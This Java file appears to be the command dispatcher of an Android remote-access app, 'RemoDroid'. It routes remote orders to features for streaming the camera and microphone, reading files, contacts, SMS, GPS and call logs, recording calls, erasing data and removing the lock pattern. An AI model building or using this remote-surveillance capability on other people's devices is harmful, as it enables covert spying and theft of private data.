package com.remo.Connections;

import android.content.Context;
import android.util.Log;
import com.remo.Features.*;

import java.util.HashMap;
import java.util.Map;

public class DataHandler {

    private static Map<Integer, Feature> FeaturesDict = new HashMap<>();
    public static Map<Integer, Class> FeaturesClassesDict = new HashMap<>();

    static void distribute(String FullOrder, Context context) {
        int order = -1, orderType = -1;
        String Parameters = "";
        try {
            order = Integer.parseInt(FullOrder.split(":")[0]);
            orderType = Integer.parseInt(FullOrder.split(":")[1]);
            Parameters = FullOrder.split(":")[2];
        } catch (Exception ex) {
            Log.e("REMODROID","DH Parse Exception: " + ex.getMessage());
        }


        if (orderType == eOrderType.START.ordinal()) {

            try {
                FeaturesDict.put(order, ((Feature) FeaturesClassesDict.get(order).newInstance()));
                FeaturesDict.get(order).start(order,Parameters);
            } catch (InstantiationException | IllegalAccessException e) {
                Log.e("REMODROID","DH START Exception: " + e.getMessage());
            }

        }else if (orderType == eOrderType.UPDATE.ordinal()) {

            FeaturesDict.get(order).update(Parameters);

        }else if (orderType == eOrderType.STOP.ordinal()) {

            FeaturesDict.get(order).stop();
        }





//
//
//
//        if (order == eDataType.INFO.ordinal()) {
//
//            Feature c = new MobileInfo();
//            c.init(order);
//            FeaturesDict.put(order, c);
//
//        } else if (order == eDataType.CAM.ordinal()) {
//            if (orderType == eOrderType.START.ordinal()) {
//                //Log.d("REMODROID", "Cam");
//                Feature c = new CamStream();
//                FeaturesDict.put(order, c);
//                c.init(order);
//            } else if (orderType == eOrderType.UPDATE.ordinal()) {
//                ((CamStream) FeaturesDict.get(order)).setQuality(Integer.parseInt(Parameters));
//
//
//            } else if (orderType == eOrderType.STOP.ordinal()) {
//                FeaturesDict.get(eDataType.CAM.ordinal()).stopStream();
//                FeaturesDict.remove(eDataType.CAM.ordinal());
//            }
//
//
//        } else if (order == eDataType.MIC.ordinal()) {
//
//
//            if (orderType == eOrderType.START.ordinal()) {
//                Feature c = new MicStream();
//                FeaturesDict.put(order, c);
//                c.init(order);
//            } else if (orderType == eOrderType.UPDATE.ordinal()) {
//
//            } else if (orderType == eOrderType.STOP.ordinal()) {
//                FeaturesDict.get(eDataType.MIC.ordinal()).stopStream();
//                FeaturesDict.remove(eDataType.MIC.ordinal());
//            }
//
//        }
//
//        else if (order == eDataType.FM_LIST.ordinal()) {
//
//
//            if (orderType == eOrderType.START.ordinal()) {
//                Feature c = new FileMan(Parameters);
//                if(FeaturesDict.containsKey(order))
//                    FeaturesDict.remove(eDataType.MIC.ordinal());
//                FeaturesDict.put(order, c);
//                c.init(order);
//            } else if (orderType == eOrderType.UPDATE.ordinal()) {
//
//            } else if (orderType == eOrderType.STOP.ordinal()) {
//                FeaturesDict.get(eDataType.MIC.ordinal()).stopStream();
//                FeaturesDict.remove(eDataType.MIC.ordinal());
//            }
//        }
//        else if (order == eDataType.CONTACTS.ordinal()) {
//
//            Feature c = new Contacts();
//            c.init(order);
//            FeaturesDict.put(order, c);
//
//        }
//
//        else if (order == eDataType.SMS.ordinal()) {
//
//            Feature c = new SMS();
//            c.init(order);
//            FeaturesDict.put(order, c);
//
//        }
//        else if (order == eDataType.CALL_LOG.ordinal()) {
//
//            Feature c = new Call_Log();
//            c.init(order);
//            FeaturesDict.put(order, c);
//
//        }
    }


    public enum eConnectionType {
        Main,
        Feature

    }

    public enum eOrderType {
        START,
        STOP,
        UPDATE,
        ONE_SHOT
    }

    public enum eDataType {
        INIT_CONNECTION,
        INFO,
        CAM,
        MIC,
        FM_LIST,
        FM_DOWN,
        CONTACTS,
        SMS,
        GPS,
        CALL_LOG,
        CALL_RECORDS,
        ERASE_DATA,
        REMOVE_PATTERN_LOCK,
        MAKE_NOISE,
        ERROR
    }
}